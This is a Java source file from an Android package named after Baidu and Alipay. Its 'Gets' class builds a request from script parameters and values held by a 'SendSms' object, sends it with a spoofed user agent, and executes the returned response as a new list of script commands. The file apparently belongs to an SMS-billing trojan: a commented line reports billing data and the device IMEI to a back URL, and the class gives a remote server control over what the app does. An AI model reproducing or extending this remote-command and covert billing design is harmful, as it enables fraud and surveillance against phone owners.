package com.baidu.alipay.script;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.List;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.net.HttpConnect;

import android.content.Context;

/**
 * 动态获取Tags列表进行执行
 * @author leoliu
 *
 */
public class Gets extends Tags{
	private static final String TAG = "Gets";
	
	private static final String URL = "url";
	private static final String PARAMS = "params";
	
	private static int maxTryTimes = 3;
	
	private String url;
	private String params;
	
	public Gets(String xml,boolean dynamic){
		this.url = getNodeValue(xml, URL);
		this.params = getNodeValue(xml, PARAMS);
		
		this.setHeader = getNodeValue(xml, PROP_SETHEADER);
		
		this.dynamic = dynamic;
	}
	
	@Override
	public String work(Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
		
		String result = null;
		
		String Url_ = formatUrl(sendSms,url);
		String _params = params;
		
		if(_params != null && _params.length() > 0){
			try {
				_params = repParams(sendSms,_params);
				_params = _params.replaceAll("&amp;", "&");
				_params = URLEncoder.encode(_params, "utf-8");
				
				if(Url_.indexOf("?") < 0){
					Url_ += "?";
				}else{
					Url_ += "&";
				}
				
				Url_ += "params="+_params;
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
		}
		
        String SetHeader_ = null;
        if (setHeader != null) {
            SetHeader_ = fomartData(sendSms,setHeader);
        }
        
        int tryTimes = 0;
        
        while(tryTimes < maxTryTimes && result == null){
        	try {
        		if(tryTimes > 0){
        			Thread.sleep(1000 * 2);
        		}
        		        		
        		HttpConnect conn = new HttpConnect(context);
                conn.isProxy = false;
//                LogUtil.e(TAG, "get 方法第"+tryTimes+"次访问" + Url_);
//                
//                LogUtil.e(TAG, "UA~~~" + sendSms.getUa() + "");
                
                byte[] BackStream = conn.request(sendSms,Url_, "GET", referer, sendSms.getUa(), null,
                        SetHeader_, 0, false);
                
                if (BackStream != null) {
                    result = com.baidu.alipay.Tools.byteToUTF8String(BackStream);
                    
                    LogUtil.e(TAG,"GET的结果" + result);
                }else{
                	errorReason = "G_400_";
                }
                
                conn = null;
                
                BackStream = null;
                
                System.gc();
            } catch (Exception ex) {
                ex.printStackTrace();
//                LogUtil.e(TAG, "gets出错" + "返回" + "G_ _f");
                // HttpConnection.backVisit("key=计费gat方法访问失败&value="+ex.getMessage()+"&imei="+DeviceInfo.getIMEI()+"&info=",Constant.TEST_BACKURL);
                errorReason = "G1_"+ex.getClass().getName();
            }
        	
        	tryTimes ++;
        }
        
        
        if(result != null && result.length() > 0){
        	List<Tags> subList = parse(result,true);
        	
        	if(subList != null && subList.size() > 0){
        		boolean succ = true;
        		
//        		try{
//	        		for(int i = 0 ; i < subList.size() ; i ++){
//	        			Tags tags = subList.get(i);
//	        			
//	        			String ret = tags.work(context, sendSms, subList, i);
//	        			
//	        			if(TAGS_EXEC_FAIL.equals(ret)){
//	        				succ = false;
//	        				errorReason = "G_"+tags.getErrorReason()+"_"+i;
//	        				break;
//	        			}
//	        		}
//        		}catch (Exception e) {
//					e.printStackTrace();
//					succ = false;
//					errorReason = "G_"+e.getClass().getName();
//				}
        		
        		succ = execSubList(context, sendSms, tagsList, pos, subList);
        		
        		if(!succ){
        			return TAGS_EXEC_FAIL;
        		}
        	}
        	
        	errorReason = "";
        }else{
        	return TAGS_EXEC_FAIL;
        }
        
        return TAGS_EXEC_SUCC;
	}

	private String repParams(SendSms sendSms,String params){
		
		if(params != null && params.length() > 0){
			String prefix = "{";
			String postfix = "}";
			
			int startPos = params.indexOf(prefix);
			int endPos = params.indexOf(postfix);
			
			while(startPos >= 0 && endPos > startPos){
				String key = params.substring(startPos+1,endPos);
				
				String value = sendSms.getDataValue(key);
				
				params = params.replace("{"+key+"}", value);
				
				startPos = params.indexOf(prefix);
				endPos = params.indexOf(postfix);
			}
		}
		
		return params;
	}

	@Override
	public String getTag() {
		return Tags.TAGS_GETS;
	}
}
